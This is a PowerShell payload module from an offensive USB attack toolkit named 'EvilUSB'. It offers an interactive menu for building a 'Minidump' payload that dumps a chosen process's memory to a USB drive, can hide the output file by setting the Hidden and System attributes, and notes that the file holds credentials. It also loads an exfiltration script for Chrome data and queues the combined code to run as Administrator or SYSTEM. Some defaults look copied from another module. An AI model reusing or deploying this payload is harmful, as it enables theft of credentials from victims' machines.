<#
	This file is part of EvilUSB
	
	Copyright 2017 @H3LL0WORLD

	Licensed under the Apache License, Version 2.0 (the "License");
	you may not use this file except in compliance with the License.
	You may obtain a copy of the License at

	http://www.apache.org/licenses/LICENSE-2.0

	Unless required by applicable law or agreed to in writing, software
	distributed under the License is distributed on an "AS IS" BASIS,
	WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
	See the License for the specific language governing permissions and
	limitations under the License.
#>
Function Main {
	$PayloadInfo = New-Object PSObject -Property @{
		Name = 'Minidump'
		Author = '@mattifestation'
		Description = "Out-Minidump writes a process dump file with all process memory to USB.`nThis is similar to running procdump.exe with the '-ma' switch."
		Link = 'http://www.exploit-monday.com/'
		'System Required' = 'False'
	}
	$ShowInfo = {
		$PayloadInfo | Format-List Name,Author,Description,Link,'System Required'
	}
	$Help = @{
		0 = New-Object PSObject -Property @{Command = 'Help'; Description = 'Show this menu'}
		1 = New-Object PSObject -Property @{Command = 'Options'; Description = 'Show the options for the payload'}
		2 = New-Object PSObject -Property @{Command = 'Set'; Description = 'Set an option'}
		3 = New-Object PSObject -Property @{Command = 'Add'; Description = 'Save the payload'}
		4 = New-Object PSObject -Property @{Command = 'Quit'; Description = 'Quit the payload'}
		5 = New-Object PSObject -Property @{Command = 'Info'; Description = 'Show information about the payload'}
		6 = New-Object PSObject -Property @{Command = 'Cls'; Description = 'Clear the screen'}
	}
	$HelpAliases = @{
		0 = New-Object PSObject -Property @{Alias = '?,-?,/?'; Description = 'Alias for Help'}
		1 = New-Object PSObject -Property @{Alias = 'Save'; Description = 'Alias for Add'}
		2 = New-Object PSObject -Property @{Alias = 'Show'; Description = 'Alias for Options'}
		3 = New-Object PSObject -Property @{Alias = 'Exit'; Description = 'Alias for Quit'}
		4 = New-Object PSObject -Property @{Alias = 'Back'; Description = 'Alias for Quit'}
		5 = New-Object PSObject -Property @{Alias = 'Main'; Description = 'Alias for Quit'}
	}
	$Options = @{
		# The value of the property 'name' should be the same than the name of the object
		'ProcessName' = New-Object PSObject -Property @{
			'Name' = "ProcessName"
			'Description' = "Process name to dump memory"
			'Required' = "True"
			'Value' = ""
		}
		'OutputFile' = New-Object PSObject -Property @{
			'Name' = "OutputFile"
			'Description' = "Path to Output file"
			'Required' = "True"
			'Value' = '$PWD\BrowserInformation-$([Environment]::UserName)@$([Environment]::MachineName).txt'
		}
		'Hide' = New-Object PSObject -Property @{
			'Name' = "Hide"
			'Description' = "Hide Output file?"
			'Required' = "False"
			'Value' = $false
		}
	}

	# Show the info of the module
	$ShowInfo.Invoke()
	
	While ($true) {
		Write-Host "($($LANG[0]): " -NoNewLine
		Write-Host $PayloadInfo.Name -NoNewline -ForegroundColor Red
		Write-Host ') > ' -NoNewLine
		$Opc = Read-Host
		if ($Opc) {
			if ($Opc.Split(' ')[0] -eq 'Set') {
				if ($Opc.Split(' ').Length -ge 3) {
					$Option = $Opc.Split(' ')[1]
					if ($Options.$Option) {
						$Value = $Opc.Remove(0,5 + $Option.Length)
						IEX ('$Options.' + $Option + '.Value = "' + $Value + '"')
					}
				} else {
					
				}
			} elseif (('Help', '?', '-?', '/?') -eq $Opc.Split(' ')[0]) {
				# Print Help Menu
				$Help.Values | Sort-Object -Property Command,Description | Out-Host
				# Print Aliases Menu
				$HelpAliases.Values | Select Alias,Description | Sort-Object -Property Alias | Out-Host
			} elseif ( ('Options','Show') -eq $Opc.Split(' ')[0] ) {
				# Show Options
				## Format
				$Format = @{Expression={$_.Name}; Label = "Name"; Width = 12; Alignment = "Left"},
						  @{Expression={$_.Required[0].ToString().ToUpper() + ($_.Required[1..$_.Required.length] -Join '').ToLower()}; Label = "Required"; Width = 8; Alignment = "Left"},
						  @{Expression={if ($_.Value.length -lt 61){$_.Value}else{$_.Value.Remove(58) + '...'}}; Label = "Value"; Alignment = "Left"},
						  @{Expression={$_.Description}; Label = "Description"; Width = 35; Alignment = "Left"}
				## Show Options in Table Format
				$Options.Values | Sort-Object -Property Name | Format-Table $Format | Out-Host
			} elseif ( ('Save','Add') -eq $Opc.Split(' ')[0] ) {
				$Ready = $true
				foreach ($Option in $Options.Keys)
				{
					if ($Options.($Option).Required -eq 'True' -and $Options.($Option).Value -eq '')
					{
						Write-Host -ForegroundColor Red Value required for option: $Option
						$Ready = $false
					}
				}
				if ($Ready)
				{
					EvilUSB:Print 0 $LANG[28]
					Add-Payload
					return
				}
			} elseif ( ('Exit', 'Quit', 'Back', 'Main') -eq $Opc.Split(' ')[0] ) {
				EvilUSB:Print 0 $LANG[29]
				return
			} elseif ($Opc.Split(' ')[0] -eq'Info') {
				$ShowInfo.Invoke()
			} elseif ($Opc.Split(' ')[0] -eq'Cls') {
				Clear-Host
			} else {
				EvilUSB:Print 1 $LANG[30]
				EvilUSB:Print 0 $LANG[31]
			}
		}
		#Sleep -Mil 100
	}
}

Function Add-Payload {
	# This function will be executed once the user run the 'add' command, this mean that the options should be already filled
	# You can evalue the values of the '$Options' variable
	# e.g:
	$ModuleSource = Get-Content "$PWD\data\payload_source\Exfiltration\Get-ChromeDump.ps1" | Out-String
	
	$Command = "Out-Minidump (Get-Process '" + $Options.ProcessName.Value + "')"
	$Command += " -DumpFilePath $($Options.OutputFile.Value);"
	
	if ($Options.Hide.Value -or $Options.Hide.Value -eq "true")
	{
		$Command += 'Set-ItemProperty "' + $Options.OutputFile.Value + '" -Name Attributes -Value "ReadOnly, Hidden, System, Archive";'
		EvilUSB:Print 0 "Use 'attrib /s /d -s -r -h <file_path>' to unhide the credentials file."
	}
	
	$PayloadCode = $ModuleSource + $Command
	
	
	$PayloadToAdd = New-Object PSCustomObject -Property @{
		Code = $PayloadCode
		User = if ($PayloadInfo.'System Required' -eq 'True') {'SYSTEM'} else {'Administrator'}
	}
	
	try {
		$Global:PayloadsToWrite.Add($PayloadInfo.Name, $PayloadToAdd) # <-- Problema
	} catch [ArgumentException] {
		EvilUSB:Print 1 $LANG[32]
		#$error[0]
	}
}

Main
